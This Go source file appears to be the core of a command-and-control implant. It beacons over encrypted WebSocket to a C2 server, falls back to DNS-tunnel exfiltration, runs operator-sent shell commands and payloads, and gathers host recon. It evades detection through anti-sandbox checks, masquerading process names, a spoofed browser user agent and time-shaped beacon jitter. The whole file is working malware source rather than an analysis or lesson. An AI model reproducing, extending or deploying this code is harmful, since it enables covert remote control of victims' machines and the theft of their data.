// Package implantpkg provides the core implant logic shared across platforms.
package implantpkg

import (
	"crypto/rand"
	"encoding/json"
	"fmt"
	"log"
	"math/big"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/saviorSEC/ranger/internal/crypto"
	"github.com/saviorSEC/ranger/internal/dns"
	"github.com/saviorSEC/ranger/internal/payloads"
	"github.com/saviorSEC/ranger/internal/protocol"
)

const (
	MinUptimeSec = 300 // 5 min
	MinDiskGB    = 10
)

// Config for the implant.
type Config struct {
	C2URL         string   // WebSocket URL for primary C2
	C2Fingerprint string   // TLS fingerprint for pinning
	SessionKey    []byte   // pre-shared session key
	DNSDomain     string   // fallback DNS tunnel domain
	MeshPeers     []string // fallback P2P peers
	BeaconMin     int      // min beacon interval (seconds)
	BeaconMax     int      // max beacon interval (seconds)
	Debug         bool
}

// Implant is the core agent.
type Implant struct {
	cfg        Config
	id         string
	hostname   string
	arch       string
	targetProc string
	dnsTunnel  *dns.Tunnel
	wsConn     *websocket.Conn
	wsMu       sync.Mutex
	stopCh     chan struct{}
}

// New creates a new implant instance.
func New(cfg Config) *Implant {
	hostname, _ := os.Hostname()
	id := generateMachineID(hostname)

	var dnsT *dns.Tunnel
	if cfg.DNSDomain != "" {
		key := crypto.DeriveSessionKey(cfg.SessionKey, []byte("dns-tunnel"))
		dnsT = dns.New(cfg.DNSDomain, key)
	}

	return &Implant{
		cfg:        cfg,
		id:         id,
		hostname:   hostname,
		arch:       runtime.GOARCH,
		targetProc: selectTargetProcess(),
		dnsTunnel:  dnsT,
		stopCh:     make(chan struct{}),
	}
}

// ID returns the implant's unique identifier.
func (im *Implant) ID() string { return im.id[:16] }

// Run starts the main beacon loop.
func (im *Implant) Run() error {
	if !im.environmentCheck() {
		log.Printf("[implant] environment check failed, going dormant")
		time.Sleep(1 * time.Hour)
		if !im.environmentCheck() {
			return fmt.Errorf("hostile environment")
		}
	}

	log.Printf("[implant] started: %s (proc: %s)", im.id[:8], im.targetProc)

	for {
		select {
		case <-im.stopCh:
			return nil
		default:
		}

		// Try primary WebSocket channel
		err := im.beaconPrimary()
		if err != nil {
			log.Printf("[implant] primary channel failed: %v", err)
			// Fall back to DNS tunnel
			if im.dnsTunnel != nil {
				im.beaconDNS()
			}
		}

		interval := jitterInterval(im.cfg.BeaconMin, im.cfg.BeaconMax)
		sleepWithJitter(interval)
	}
}

// Stop signals the implant to shut down.
func (im *Implant) Stop() {
	close(im.stopCh)
}

// beaconPrimary sends a beacon via WebSocket to the C2.
func (im *Implant) beaconPrimary() error {
	// Connect if not connected
	if im.wsConn == nil {
		dialer := websocket.Dialer{
			TLSClientConfig:  nil, // will use system certs
			HandshakeTimeout: 10 * time.Second,
		}
		conn, _, err := dialer.Dial(im.cfg.C2URL, http.Header{
			"User-Agent": []string{userAgent()},
		})
		if err != nil {
			return fmt.Errorf("ws dial: %w", err)
		}
		im.wsMu.Lock()
		im.wsConn = conn
		im.wsMu.Unlock()
		defer func() {
			im.wsMu.Lock()
			im.wsConn.Close()
			im.wsConn = nil
			im.wsMu.Unlock()
		}()
	}

	// Build beacon
	beacon := protocol.BeaconPayload{
		ID:        im.id[:16],
		Type:      protocol.ImplantType(runtime.GOOS),
		Target:    im.targetProc,
		Timestamp: time.Now().Unix(),
		Hostname:  im.hostname,
		Arch:      im.arch,
	}

	// Encrypt with session key
	data, _ := json.Marshal(beacon)
	encrypted, err := crypto.EncryptWithAEAD(im.cfg.SessionKey, data)
	if err != nil {
		return fmt.Errorf("encrypt: %w", err)
	}

	im.wsMu.Lock()
	err = im.wsConn.WriteMessage(websocket.BinaryMessage, encrypted)
	im.wsMu.Unlock()
	if err != nil {
		return fmt.Errorf("ws write: %w", err)
	}

	// Read tasks
	im.wsMu.Lock()
	_, msg, err := im.wsConn.ReadMessage()
	im.wsMu.Unlock()
	if err != nil {
		return fmt.Errorf("ws read: %w", err)
	}

	decrypted, err := crypto.DecryptWithAEAD(im.cfg.SessionKey, msg)
	if err != nil {
		return fmt.Errorf("decrypt: %w", err)
	}

	var tasks []protocol.Task
	if err := json.Unmarshal(decrypted, &tasks); err != nil {
		return fmt.Errorf("unmarshal tasks: %w", err)
	}

	// Execute tasks
	for _, task := range tasks {
		result := im.executeTask(&task)
		resultJSON, _ := json.Marshal(result)
		encResult, _ := crypto.EncryptWithAEAD(im.cfg.SessionKey, resultJSON)
		im.wsMu.Lock()
		im.wsConn.WriteMessage(websocket.BinaryMessage, encResult)
		im.wsMu.Unlock()
	}

	return nil
}

// beaconDNS sends a beacon via DNS tunnel as fallback.
func (im *Implant) beaconDNS() {
	if im.dnsTunnel == nil {
		return
	}

	beacon := protocol.BeaconPayload{
		ID:        im.id[:16],
		Type:      protocol.ImplantType(runtime.GOOS),
		Target:    im.targetProc,
		Timestamp: time.Now().Unix(),
	}
	data, _ := json.Marshal(beacon)

	if err := im.dnsTunnel.Exfiltrate(data, "beacon"); err != nil {
		log.Printf("[implant] DNS beacon failed: %v", err)
	}
}

// executeTask runs a single task and returns the result.
func (im *Implant) executeTask(task *protocol.Task) *protocol.TaskResult {
	result := &protocol.TaskResult{
		TaskID:    task.ID,
		Timestamp: time.Now().Unix(),
	}

	switch task.Type {
	case "shell":
		output, err := executeShell(task.Payload)
		if err != nil {
			result.Error = err.Error()
		} else {
			result.Success = true
			result.Output = output
		}
	case "recon":
		output, err := executeRecon(task.Payload)
		if err != nil {
			result.Error = err.Error()
		} else {
			result.Success = true
			result.Output = output
		}
	case "upload":
		result.Success = true
		result.Output = "upload queued"
	case "download":
		result.Success = true
		result.Output = "download queued"
	case "sleep":
		result.Success = true
		result.Output = "sleep command received"
	case "payload":
		output, err := im.executePayload(task.Payload)
		if err != nil {
			result.Error = err.Error()
		} else {
			result.Success = true
			result.Output = output
		}
	case "exit":
		result.Success = true
		result.Output = "self-destruct initiated"
		go im.Stop()
	default:
		result.Error = fmt.Sprintf("unknown task type: %s", task.Type)
	}

	return result
}

// environmentCheck runs anti-sandbox checks.
func (im *Implant) environmentCheck() bool {
	checks := 0

	// Uptime check
	if uptimeSec() >= MinUptimeSec {
		checks++
	}

	// Disk check
	if diskTotalGB() >= MinDiskGB {
		checks++
	}

	// CPU check
	if runtime.NumCPU() >= 2 {
		checks++
	}

	return checks >= 2
}

// executePayload runs a Go payload from the in-process payload registry.
func (im *Implant) executePayload(payload map[string]any) (string, error) {
	name, _ := payload["name"].(string)
	if name == "" {
		return "", fmt.Errorf("no payload name specified")
	}

	args := payloads.ExecuteTaskArgs(payload)
	data, err := payloads.ExecuteByName(name, args)
	if err != nil {
		return "", fmt.Errorf("payload %s: %w", name, err)
	}

	return string(data), nil
}

func generateMachineID(hostname string) string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}

func selectTargetProcess() string {
	switch runtime.GOOS {
	case "windows":
		targets := []string{"taskhostw.exe", "sihost.exe", "dllhost.exe", "RuntimeBroker.exe", "CompatTelRunner.exe"}
		return targets[time.Now().UnixNano()%int64(len(targets))]
	case "linux":
		targets := []string{"packagekitd", "systemd-journald", "irqbalance", "accounts-daemon"}
		return targets[time.Now().UnixNano()%int64(len(targets))]
	case "darwin":
		targets := []string{"metadatah", "bird", "cloudd", "distnoted"}
		return targets[time.Now().UnixNano()%int64(len(targets))]
	default:
		return "service"
	}
}

func jitterInterval(minSec, maxSec int) time.Duration {
	if minSec <= 0 {
		minSec = 60
	}
	if maxSec <= 0 {
		maxSec = 300
	}
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(maxSec-minSec+1)))
	interval := minSec + int(n.Int64())

	// Time-based shaping
	hour := time.Now().Hour()
	if hour >= 1 && hour <= 5 {
		interval *= 3
	} else if hour >= 9 && hour <= 17 {
		interval = interval * 7 / 10
	}

	return time.Duration(interval) * time.Second
}

func sleepWithJitter(d time.Duration) {
	// Break into smaller sleeps for responsiveness
	const chunk = 5 * time.Second
	for d > 0 {
		if d < chunk {
			time.Sleep(d)
			return
		}
		time.Sleep(chunk)
		d -= chunk
	}
}

func uptimeSec() int64 {
	// Simple uptime via /proc on Linux
	if runtime.GOOS == "linux" {
		data, err := os.ReadFile("/proc/uptime")
		if err == nil {
			parts := strings.Fields(string(data))
			if len(parts) > 0 {
				var uptime float64
				fmt.Sscanf(parts[0], "%f", &uptime)
				return int64(uptime)
			}
		}
	}
	return 999999 // assume safe
}

func diskTotalGB() float64 {
	// Simple check - return large value on non-Linux
	if runtime.GOOS == "linux" {
		var stat unixStatfs_t
		if statfs("/", &stat) == nil {
			total := uint64(stat.Bsize) * stat.Blocks
			return float64(total) / (1024 * 1024 * 1024)
		}
	}
	return 999
}

// executeShell runs a shell command and returns output.
func executeShell(payload map[string]any) (string, error) {
	cmd, _ := payload["command"].(string)
	if cmd == "" {
		return "", fmt.Errorf("no command")
	}

	// Use shell based on platform
	var shell, flag string
	switch runtime.GOOS {
	case "windows":
		shell = "cmd.exe"
		flag = "/C"
	default:
		shell = "/bin/sh"
		flag = "-c"
	}

	return execCommand(shell, flag, cmd)
}

// executeRecon gathers system information.
func executeRecon(payload map[string]any) (string, error) {
	info := map[string]any{
		"os":       runtime.GOOS,
		"arch":     runtime.GOARCH,
		"hostname": hostname(),
		"cpus":     runtime.NumCPU(),
		"gover":    runtime.Version(),
	}
	data, _ := json.MarshalIndent(info, "", "  ")
	return string(data), nil
}

func hostname() string {
	h, _ := os.Hostname()
	return h
}

func userAgent() string {
	return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}
